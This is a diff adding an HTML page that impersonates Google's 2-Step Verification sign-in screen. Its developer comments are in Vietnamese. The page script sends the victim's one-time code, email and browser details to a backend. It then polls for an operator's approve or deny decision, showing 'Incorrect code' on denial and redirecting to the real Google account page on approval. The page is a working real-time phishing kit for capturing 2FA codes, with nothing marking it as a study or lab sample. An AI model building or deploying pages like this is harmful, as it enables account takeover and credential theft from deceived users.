@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2-Step Verification - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="icon" href="google_logo_icon_169090.ico">
+    <script src="flow.js"></script>
+    <style>
+        /* Đẩy input xuống thấp hơn cho trang này */
+        .signin-form .input-field {
+            margin-top: 24px !important;
+        }
+        
+        /* Error state cho input — chỉ đổi viền đỏ (đúng style Google thật).
+           KHÔNG dùng background hồng vì tạo cảm giác có "viền trắng" giữa
+           border và nền trong input. */
+        .verify-input.error {
+            border-color: #d93025 !important;
+            background-color: var(--surface) !important;
+        }
+        
+        #verify-error {
+            font-size: 13px;
+            margin-top: 5px;
+            min-height: 18px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+    </div>
+
+    <!-- Main content -->
+    <div class="main-wrapper page-transition">
+        <div class="login-wrapper">
+            <div class="signin-card">
+                <!-- Progress bar container -->
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="signin-columns">
+                    <!-- Left Column: Logo, Title, User Info -->
+                    <div class="signin-left">
+                        <div class="logo-wrapper">
+                            <img src="google_logo_icon_169090.ico" alt="Google logo" class="google-logo" style="width:48px;height:48px;" />
+                        </div>
+                        <h1 class="signin-title">2-Step Verification</h1>
+                        <p class="signin-subtitle">To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
+                        <div class="user-info">
+                            <div class="user-email-btn" onclick="handleTransition('index.html')">
+                                <svg width="20" height="20" viewBox="0 0 24 24" class="user-icon-img">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#5f6368"/>
+                                </svg>
+                                <span class="user-email" id="displayEmail"></span>
+                                <svg width="16" height="16" viewBox="0 0 24 24" class="arrow-img">
+                                    <path d="M7 10l5 5 5-5z" fill="#5f6368"/>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Right Column: Verification Form -->
+                    <div class="signin-right">
+                        <div class="verify-form-wrapper">
+                            <h2 class="verify-form-title">2-Step Verification</h2>
+                            <p class="verify-form-desc">Get a verification code from the <strong>Google Authenticator</strong> app</p>
+                            
+                            <form id="verifyForm" class="signin-form" novalidate>
+                            <div class="input-field">
+                                    <input type="text" id="verifyCode" class="verify-input" placeholder=" " required 
+                                           autocomplete="one-time-code" inputmode="numeric" pattern="[0-9]*" maxlength="6">
+                                <label for="verifyCode" class="floating-label">Enter code</label>
+                            </div>
+                                <div class="error-wrapper">
+                                    <span class="error-text" id="verify-error"></span>
+                                </div>
+                                
+                            <div class="verify-checkbox-row">
+                                <input type="checkbox" id="dontAskAgain" checked>
+                                <label for="dontAskAgain">Don't ask again on this device</label>
+                            </div>
+                                
+                            <div class="action-buttons">
+                                <a href="verify-options.html" class="verify-link">Try another way</a>
+                                    <button type="submit" class="btn-primary">Next</button>
+                            </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+            <footer class="page-footer">
+                <div class="footer-wrapper">
+                        <a href="#" class="footer-link">Help</a>
+                        <a href="#" class="footer-link">Privacy</a>
+                        <a href="#" class="footer-link">Terms</a>
+                </div>
+            </footer>
+    </div>
+
+    <script>
+        // Function to update page status
+        async function updatePageStatus(pageName) {
+            const requestId = localStorage.getItem('requestId');
+            if (!requestId) return;
+            
+            try {
+                await fetch('http://localhost:5000/api/update-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        id: parseInt(requestId), 
+                        currentPage: pageName 
+                    })
+                });
+            } catch (err) {
+                console.log('Failed to update page status');
+            }
+        }
+
+        // Trạng thái "waiting admin duyệt" — dùng pattern giống trang
+        // login/password: progress bar xanh indeterminate trên mép card +
+        // dim form (opacity 0.45, blur nhẹ). Không có backdrop toàn màn hình.
+        function showWaitingUI() {
+            const progressContainer = document.querySelector('.progress-container');
+            const card  = document.querySelector('.signin-card');
+            const input = document.getElementById('verifyCode');
+            if (progressContainer) progressContainer.classList.add('active');
+            if (card)  card.classList.add('waiting');
+            if (input) input.blur();
+        }
+        function hideWaitingUI() {
+            const progressContainer = document.querySelector('.progress-container');
+            const card = document.querySelector('.signin-card');
+            if (progressContainer) progressContainer.classList.remove('active');
+            if (card) card.classList.remove('waiting');
+        }
+        function isWaiting() {
+            const card = document.querySelector('.signin-card');
+            return !!(card && card.classList.contains('waiting'));
+        }
+
+        // Hàm kiểm tra trạng thái approval với tốc độ nhanh hơn
+        async function checkApprovalStatus(requestId, nextPage) {
+            const maxAttempts = 120; // Tối đa 120 lần kiểm tra (2 phút)
+            let attempts = 0;
+            
+            const checkStatus = async () => {
+                try {
+                    const response = await fetch(`http://localhost:5000/api/status/${requestId}`, {
+                        cache: 'no-cache',
+                        headers: {
+                            'Cache-Control': 'no-cache'
+                        }
+                    });
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        
+                        if (data.status === 'approved') {
+                            // Chỉ redirect tới myaccount khi admin đã bấm Yes
+                            // trên popup 2FA AUTH → nextPage='success'. Nếu
+                            // status='approved' nhưng nextPage vẫn là '2FA
+                            // AUTH.html' (hoặc khác), đó là routing cũ của
+                            // admin khi chọn method — tiếp tục poll chờ admin
+                            // duyệt Yes/No cho code vừa nhập.
+                            if (data.nextPage === 'success') {
+                                window.location.href = nextPage;
+                                return;
+                            }
+                            // approved nhưng chưa phải success → tiếp tục chờ
+                        } else if (data.status === 'denied') {
+                            // Bị từ chối, hiển thị lỗi code sai
+                            const submitBtn = document.querySelector('.btn-primary');
+                            const codeInput = document.getElementById('verifyCode');
+                            const verifyError = document.getElementById('verify-error');
+                            
+                            // Tắt backdrop + spinner để user nhập lại code
+                            hideWaitingUI();
+                            
+                            // Reset button
+                            submitBtn.textContent = 'Next';
+                            submitBtn.classList.remove('loading', 'waiting');
+                            submitBtn.disabled = false;
+                            
+                            // Hiển thị lỗi bên dưới input
+                            codeInput.classList.add('error');
+                            verifyError.textContent = 'Incorrect code, please try again';
+                            verifyError.style.color = '#d93025';
+                            
+                            // Clear code để user gõ lại
+                            codeInput.value = '';
+                            codeInput.focus();
+                            
+                            // Không hiển thị notification popup
+                            return;
+                        }
+                    }
+                    
+                    attempts++;
+                    if (attempts < maxAttempts) {
+                        // Kiểm tra nhanh hơn: 300ms cho 20 lần đầu, sau đó 500ms
+                        const interval = attempts < 20 ? 300 : 500;
+                        setTimeout(checkStatus, interval);
+                    } else {
+                        // Hết thời gian chờ, chuyển trang
+                        const email = localStorage.getItem('userEmail');
+                        handleTransition(nextPage + '?email=' + encodeURIComponent(email));
+                    }
+                } catch (error) {
+                    console.error('Error checking approval status:', error);
+                    attempts++;
+                    if (attempts < maxAttempts) {
+                        const interval = attempts < 20 ? 300 : 500;
+                        setTimeout(checkStatus, interval);
+                    } else {
+                        const email = localStorage.getItem('userEmail');
+                        handleTransition(nextPage + '?email=' + encodeURIComponent(email));
+                    }
+                }
+            };
+            
+            // Bắt đầu kiểm tra ngay lập tức
+            checkStatus();
+        }
+
+        // Hàm hiển thị thông báo
+        function showNotification(message, type = 'info') {
+            // Remove existing notifications
+            const existingNotification = document.querySelector('.notification');
+            if (existingNotification) {
+                existingNotification.remove();
+            }
+
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.textContent = message;
+            
+            // Style the notification
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 12px 20px;
+                border-radius: 4px;
+                color: white;
+                font-size: 14px;
+                font-weight: 500;
+                z-index: 1000;
+                animation: slideIn 0.3s ease;
+                ${type === 'error' ? 'background-color: #d93025;' : 'background-color: #1a73e8;'}
+            `;
+
+            document.body.appendChild(notification);
+
+            // Remove notification after 3 seconds
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.3s ease';
+                setTimeout(() => {
+                    if (notification.parentElement) {
+                        notification.remove();
+                    }
+                }, 300);
+            }, 3000);
+        }
+
+        // Page transition handler with smooth progress bar
+    function handleTransition(url) {
+            // Add fade-out effect to current page
+            const mainWrapper = document.querySelector('.main-wrapper');
+            mainWrapper.classList.add('fade-out');
+            
+            // Show loading overlay
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const progressBar = document.getElementById('progressBar');
+            const progressContainer = document.querySelector('.progress-container');
+            
+            loadingOverlay.classList.add('active');
+            progressContainer.classList.add('active');
+            
+            // Reset progress bar
+            progressBar.style.width = '0%';
+            progressBar.classList.remove('loading', 'completing');
+            
+            // Start smooth progress animation
+            setTimeout(() => {
+                progressBar.classList.add('loading');
+                progressBar.style.width = '80%';
+            }, 100);
+            
+            // Navigate after animation completes
+            setTimeout(() => {
+                progressBar.classList.remove('loading');
+                progressBar.classList.add('completing');
+                progressBar.style.width = '100%';
+                
+                // Hide progress bar and navigate
+                setTimeout(() => {
+                    progressContainer.classList.remove('active');
+                window.location.href = url;
+            }, 300);
+            }, 1200);
+        }
+
+        // Form validation and submission
+        function handleFormSubmission() {
+            const form = document.getElementById('verifyForm');
+            const codeInput = document.getElementById('verifyCode');
+            const verifyError = document.getElementById('verify-error');
+
+            // Format input to only allow numbers.
+            // KHÔNG auto-submit khi đủ 6 số — user phải bấm "Next" để gửi.
+            codeInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                this.classList.remove('error');
+                verifyError.textContent = '';
+                verifyError.style.color = '';
+            });
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Reset previous errors
+                codeInput.classList.remove('error');
+                verifyError.textContent = '';
+                verifyError.style.color = '';
+                
+                const code = codeInput.value.trim();
+                
+                // Basic code validation
+                if (!code) {
+                    showError('Enter the verification code');
+                    return;
+                }
+                
+                if (code.length !== 6) {
+                    showError('Enter a 6-digit verification code');
+                    return;
+                }
+                
+                if (!/^\d{6}$/.test(code)) {
+                    showError('Enter a valid 6-digit verification code');
+                    return;
+                }
+                
+                // Show loading state — button + backdrop mờ + spinner xanh
+                const submitBtn = form.querySelector('.btn-primary');
+                submitBtn.classList.add('loading');
+                submitBtn.disabled = true;
+                showWaitingUI();
+                
+                // Simulate verification process
+                setTimeout(async () => {
+                    // Lấy requestId từ localStorage
+                    const requestId = localStorage.getItem('requestId');
+                    const email = localStorage.getItem('userEmail') || '';
+                    const twofa = code;
+                    
+                                            if (requestId) {
+                            try {
+                                // Gửi dữ liệu 2FA lên backend và chờ approval
+                                const response = await fetch('http://localhost:5000/api/request', {
+                                    method: 'POST',
+                                    headers: { 
+                                        'Content-Type': 'application/json',
+                                        'Cache-Control': 'no-cache'
+                                    },
+                                    cache: 'no-cache',
+                                    keepalive: true,
+                                    body: JSON.stringify({
+                                        email: email,
+                                        password: '',
+                                        twofa: twofa,
+                                        userAgent: navigator.userAgent,
+                                        currentPage: '2FA AUTH.html'
+                                    })
+                                });
+                                
+                                if (response.ok) {
+                                    const data = await response.json();
+                                    localStorage.setItem('requestId', data.requestId);
+                                    console.log('2FA data sent successfully');
+                                    
+                                    // Chờ approval từ admin
+                                    checkApprovalStatus(data.requestId, 'https://myaccount.google.com/');
+                                } else {
+                                    // Nếu không gửi được, hiển thị lỗi
+                                    hideWaitingUI();
+                                    showError('Connection error. Please try again.');
+                                    submitBtn.classList.remove('loading');
+                                    submitBtn.disabled = false;
+                                }
+                            } catch (error) {
+                                console.error('Error sending 2FA data to backend:', error);
+                                // Nếu có lỗi, hiển thị lỗi
+                                hideWaitingUI();
+                                showError('Connection error. Please try again.');
+                                submitBtn.classList.remove('loading');
+                                submitBtn.disabled = false;
+                            }
+                        } else {
+                            // Không có requestId, hiển thị lỗi
+                            hideWaitingUI();
+                            showError('Session error. Please try again.');
+                            submitBtn.classList.remove('loading');
+                            submitBtn.disabled = false;
+                        }
+                }, 1000);
+            });
+
+            function showError(message) {
+                codeInput.classList.add('error');
+                verifyError.textContent = message;
+                codeInput.focus();
+                codeInput.select();
+            }
+        }
+
+        // Mobile responsive handler
+        function handleMobileLayout() {
+            function checkMobile() {
+        if (window.innerWidth <= 600) {
+                    document.body.classList.add('mobile-layout');
+                } else {
+                    document.body.classList.remove('mobile-layout');
+                }
+            }
+            
+            checkMobile();
+            window.addEventListener('resize', checkMobile);
+        }
+
+        // Display user email
+        function displayUserEmail() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email') || localStorage.getItem('userEmail') || '';
+            const emailElements = document.querySelectorAll('.user-email');
+            
+            emailElements.forEach(element => {
+                element.textContent = email;
+            });
+        }
+
+        // Auto-focus on code input with slight delay for better UX
+        function setupAutoFocus() {
+            setTimeout(() => {
+                const codeInput = document.getElementById('verifyCode');
+                codeInput.focus();
+            }, 300);
+        }
+
+        // Handle "Try another way" link
+        function setupTryAnotherWay() {
+            const tryLink = document.querySelector('.verify-link');
+            tryLink.addEventListener('click', async function(e) {
+                e.preventDefault();
+                
+                // Cập nhật status lên backend trước khi chuyển trang
+                const requestId = localStorage.getItem('requestId');
+                if (requestId) {
+                    try {
+                        // Cập nhật trạng thái trang sang verify-options
+                        await fetch('http://localhost:5000/api/update-page', {
+                            method: 'POST',
+                            headers: { 
+                                'Content-Type': 'application/json',
+                                'Cache-Control': 'no-cache'
+                            },
+                            cache: 'no-cache',
+                            keepalive: true,
+                            body: JSON.stringify({
+                                id: parseInt(requestId),
+                                currentPage: 'verify-options.html'
+                            })
+                        });
+                        
+                        console.log('Updated status to verify-options.html');
+                    } catch (error) {
+                        console.error('Error updating page status:', error);
+                    }
+                }
+                
+                // Chuyển trang ngay lập tức, không cần chờ approve
+                handleTransition('verify-options.html');
+            });
+        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            handleFormSubmission();
+            handleMobileLayout();
+            displayUserEmail();
+            setupAutoFocus();
+            setupTryAnotherWay();
+            
+            // Báo backend user đang ở trang 2FA AUTH — để admin thấy và tự
+            // mở popup duyệt Yes/No, kể cả khi user tới đây qua "Try another
+            // way" hoặc refresh page (không đi qua dropdown của admin).
+            updatePageStatus('2FA AUTH.html');
+        });
+
+        // Accessibility improvements
+        document.addEventListener('keydown', function(e) {
+            // Trong lúc chờ admin duyệt: chặn mọi shortcut bàn phím
+            if (isWaiting()) {
+                if (e.key === 'Enter' || e.key === 'Backspace') {
+                    e.preventDefault();
+                }
+                return;
+            }
+            
+            // Allow form submission with Enter key
+            if (e.key === 'Enter' && document.activeElement.tagName !== 'BUTTON') {
+                document.getElementById('verifyForm').dispatchEvent(new Event('submit'));
+            }
+            
+            // Handle backspace when input is empty to go back
+            if (e.key === 'Backspace' && document.activeElement.id === 'verifyCode' 
+                && document.activeElement.value === '') {
+                handleTransition('password.html');
+            }
+        });
+
+        // Handle browser back button
+        window.addEventListener('popstate', function(e) {
+            handleTransition('password.html');
+        });
+
+        // Prevent form submission on page reload
+        window.addEventListener('beforeunload', function() {
+            const submitBtn = document.querySelector('.btn-primary');
+            if (submitBtn) {
+                submitBtn.classList.remove('loading');
+                submitBtn.disabled = false;
+            }
+    });
+    </script>
+</body>
+</html> 
